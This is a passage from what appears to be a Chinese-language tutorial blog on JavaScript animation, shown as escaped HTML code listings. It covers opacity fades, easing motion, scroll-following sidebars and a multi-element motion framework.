&#123;</span><br><span class="line">			clearInterval(timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br><span class="line">	&lt;span&gt;分享到&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="淡入淡出的图片">淡入淡出的图片</span></h4><ul>
<li>用变量存储透明度<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:200px; height:200px; background:red; filter:alpha(opacity:30); opacity:0.3;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv.onmouseover=function ()     //鼠标移入</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(100);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv.onmouseout=function ()		//鼠标移出</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(30);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var alpha=30;</span><br><span class="line">var timer=null;</span><br><span class="line"></span><br><span class="line">function startMove(iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	clearInterval(timer);  //关闭定时器</span><br><span class="line">	timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=0;</span><br><span class="line">		</span><br><span class="line">		if(alpha&lt;iTarget)  //当前透明度小于目标点</span><br><span class="line">		&#123;</span><br><span class="line">			speed=10;     //速度等于10</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;					//当前透明度大于目标点</span><br><span class="line">			speed=-10;      //速度等于-10</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		//判断是否到达目标点</span><br><span class="line">		if(alpha==iTarget)  //当前透明度等于目标点</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(timer); //关闭定时器</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			alpha+=speed;</span><br><span class="line">			</span><br><span class="line">			oDiv.style.filter=&apos;alpha(opacity:&apos;+alpha+&apos;)&apos;;</span><br><span class="line">			oDiv.style.opacity=alpha/100;  //opacity满的时候是1；</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="alpha">alpha</span></h4><p>中文：alpha<br>解释</p>
<p>表示像素不透明性的值。像素越不透明，则隐藏越多呈现图像的背景。零 alpha 表示完全透明的像素，而最大值的 alpha 表示完全不透明的像素。</p>
<h2><span id="缓冲运动">缓冲运动</span></h2><p>逐渐变慢，最后停止<br>距离越远速度越大</p>
<ul>
<li>速度由距离决定</li>
<li>速度=(目标值-当前值)/缩放系数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:100px; height:100px; background:red; position:absolute; left:600px; top:50px;&#125;</span><br><span class="line">#div2 &#123;width:1px; height:300px; position:absolute; left:300px; top:0; background:black;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">function startMove()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	setInterval(function ()&#123;</span><br><span class="line">		var speed=(300-oDiv.offsetLeft)/10;</span><br><span class="line">		//speed=Math.floor(speed);</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);   //速度为正，向上取整  速度为负，向下取整</span><br><span class="line">		</span><br><span class="line">		oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</span><br><span class="line">		</span><br><span class="line">		document.title=oDiv.offsetLeft+&apos;,&apos;+speed;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;开始运动&quot; onclick=&quot;startMove()&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="实例右侧悬浮框">实例：右侧悬浮框</span></h3><p>Bug：速度取整<br>跟随页面滚动的缓冲侧边栏</p>
<ul>
<li>潜在问题：目标值不是整数时<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:100px; height:150px; background:red; position:absolute; right:0; bottom:0;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">window.onscroll=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</span><br><span class="line">	</span><br><span class="line">	//oDiv.style.top=document.documentElement.clientHeight-oDiv.offsetHeight+scrollTop+&apos;px&apos;;</span><br><span class="line">	startMove(document.documentElement.clientHeight-oDiv.offsetHeight+scrollTop);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var timer=null;</span><br><span class="line"></span><br><span class="line">function startMove(iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	clearInterval(timer);</span><br><span class="line">	timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=(iTarget-oDiv.offsetTop)/4;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(oDiv.offsetTop==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			oDiv.style.top=oDiv.offsetTop+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4><span id="附">附</span></h4><p>网页可见区域宽：document.body.clientWidth<br>网页可见区域高：document.body.clientHeight<br>网页可见区域宽：document.body.offsetWidth (包括边线的宽)<br>网页可见区域高：document.body.offsetHeight (包括边线的宽)<br>网页正文全文宽：document.body.scrollWidth<br>网页正文全文高：document.body.scrollHeight<br>网页被卷去的高：document.body.scrollTop<br>网页被卷去的左：document.body.scrollLeft<br>网页正文部分上：window.screenTop<br>网页正文部分左：window.screenLeft<br>屏幕分辨率的高：window.screen.height<br>屏幕分辨率的宽：window.screen.width<br>屏幕可用工作区高度：window.screen.availHeight<br>屏幕可用工作区宽度：window.screen.availWidth</p>
<p>//alert(Math.ceil(-9.8));            //向上取整<br>alert(Math.floor(4.9999));                //向下取整<br>alert(Math.abs(-6));                //取绝对值</p>
<h3><span id="对联悬浮框">对联悬浮框</span></h3><p>Bug：速度取整<br>跟随页面滚动的缓冲侧边栏</p>
<ul>
<li>潜在问题：目标值不是整数时<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:100px; height:150px; background:red; position:absolute; right:0; bottom:0;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">window.onscroll=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	var scrollTop=document.documentElement.scrollTop||document.body.scrollTop;</span><br><span class="line">	//可视区的高-div的高，再除以二</span><br><span class="line">	//oDiv.style.top=(document.documentElement.clientHeight-oDiv.offsetHeight)/2+scrollTop+&apos;px&apos;;</span><br><span class="line">	startMove(parseInt((document.documentElement.clientHeight-oDiv.offsetHeight)/2+scrollTop));</span><br><span class="line">	// 目标取整 消除跳动</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var timer=null;</span><br><span class="line"></span><br><span class="line">function startMove(iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	clearInterval(timer);</span><br><span class="line">	timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=(iTarget-oDiv.offsetTop)/4;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(oDiv.offsetTop==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			document.title=iTarget;</span><br><span class="line">			document.getElementById(&apos;txt1&apos;).value=oDiv.offsetTop;</span><br><span class="line">			oDiv.style.top=oDiv.offsetTop+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;body style=&quot;height:2000px;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; id=&quot;txt1&quot; style=&quot;position:fixed; right:0; top:0;&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="匀速运动的停止条件">匀速运动的停止条件</span></h3><p>运动终止条件</p>
<ul>
<li>匀速运动：距离足够近</li>
<li>缓冲运动：两点重合</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">#div1 &#123;width:100px; height:100px; background:red; position:absolute; left:600px; top:50px;&#125;</span><br><span class="line">#div2 &#123;width:1px; height:300px; position:absolute; left:300px; top:0; background:black;&#125;</span><br><span class="line">#div3 &#123;width:1px; height:300px; position:absolute; left:100px; top:0; background:black;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">var timer=null;</span><br><span class="line"></span><br><span class="line">function startMove(iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	clearInterval(timer);</span><br><span class="line">	timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=0;</span><br><span class="line">		</span><br><span class="line">		if(oDiv.offsetLeft&lt;iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			speed=7;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			speed=-7;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		if(Math.abs(iTarget-oDiv.offsetLeft)&lt;=7)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(timer);</span><br><span class="line">			</span><br><span class="line">			oDiv.style.left=iTarget+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			oDiv.style.left=oDiv.offsetLeft+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;到100&quot; onclick=&quot;startMove(100)&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;到300&quot; onclick=&quot;startMove(300)&quot; /&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div3&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h1><span id="js运动应用">JS运动应用</span></h1><h2><span id="多物体运动框架">多物体运动框架</span></h2><h3><span id="多个物体同时运动">多个物体同时运动</span></h3><h4><span id="例子多个div鼠标移入变宽">例子：多个Div，鼠标移入变宽</span></h4><ul>
<li>单定时器，存在问题</li>
<li>每个Div一个定时器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">div &#123;width:100px; height:50px; background:red; margin:10px; border:10px solid black;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var aDiv=document.getElementsByTagName(&apos;div&apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;aDiv.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aDiv[i].timer=null;   //每个Div都有一个定时器</span><br><span class="line">		</span><br><span class="line">		aDiv[i].onmouseover=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			startMove(this, 400);</span><br><span class="line">		&#125;;</span><br><span class="line">		</span><br><span class="line">		aDiv[i].onmouseout=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			startMove(this, 100);</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//var timer=null;</span><br><span class="line"></span><br><span class="line">function startMove(obj, iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=(iTarget-obj.offsetWidth)/6;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(obj.offsetWidth==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			obj.style.width=obj.offsetWidth+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="多物体运动框架">多物体运动框架</span></h3><p>定时器作为物体的属性<br>参数的传递：物体、目标值</p>
<h4><span id="例子多个div淡入淡出">例子：多个Div淡入淡出</span></h4><ul>
<li>所有东西都不能公用</li>
<li>属性与运动对象绑定：速度、其他属性值（如透明度等）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:red; filter:alpha(opacity:30); opacity:0.3;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var aDiv=document.getElementsByTagName(&apos;div&apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;aDiv.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		aDiv[i].alpha=30;</span><br><span class="line">		</span><br><span class="line">		aDiv[i].onmouseover=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			startMove(this, 100);</span><br><span class="line">		&#125;;</span><br><span class="line">		aDiv[i].onmouseout=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			startMove(this, 30);</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//var alpha=30;</span><br><span class="line"></span><br><span class="line">function startMove(obj, iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=(iTarget-obj.alpha)/6;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(obj.alpha==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			obj.alpha+=speed;</span><br><span class="line">			</span><br><span class="line">			obj.style.filter=&apos;alpha(opacity:&apos;+obj.alpha+&apos;)&apos;;</span><br><span class="line">			obj.style.opacity=obj.alpha/100;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="例子变宽变高">例子：变宽变高</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">div &#123;width:200px; height:200px; margin:20px; float:left; background:yellow;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	var oDiv1=document.getElementById(&apos;div1&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv1.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, 400);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv1.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove(this, 200);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	var oDiv2=document.getElementById(&apos;div2&apos;);</span><br><span class="line">	</span><br><span class="line">	oDiv2.onmouseover=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove2(this, 400);</span><br><span class="line">	&#125;;</span><br><span class="line">	oDiv2.onmouseout=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		startMove2(this, 200);</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function startMove(obj, iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=(iTarget-obj.offsetHeight)/6;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(obj.offsetHeight==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			obj.style.height=obj.offsetHeight+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function startMove2(obj, iTarget)</span><br><span class="line">&#123;</span><br><span class="line">	clearInterval(obj.timer);</span><br><span class="line">	obj.timer=setInterval(function ()&#123;</span><br><span class="line">		var speed=(iTarget-obj.offsetWidth)/6;</span><br><span class="line">		speed=speed&gt;0?Math.ceil(speed):Math.floor(speed);</span><br><span class="line">		</span><br><span class="line">		if(obj.offsetWidth==iTarget)</span><br><span class="line">		&#123;</span><br><span class="line">			clearInterval(obj.timer);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			obj.style.width=obj.offsetWidth+speed+&apos;px&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;, 30);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;变高&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;变宽&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="任意值运动框架">任意值运动框架</span></h2><h3><span id="offset属性的bug">offset属性的Bug</span></h3><p>有边框的Div变宽<br>用currentStyle代替offset</p>
<ul>
<li>offsetWidth(盒模型尺寸)=width+2<em>dorder+2</em>padding</li>
<li>styl只能去行间样式</li>
<li>getStyle<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function getStyle(obj, name)  //获取不在行间的样式  </span><br><span class="line">&#123;</span><br><span class="line">	if(obj.currentStyle)</span><br><span class="line">	&#123;</span><br><span class="line">		return obj.currentStyle[name];</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return getComputedStyle(obj, false)[name];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
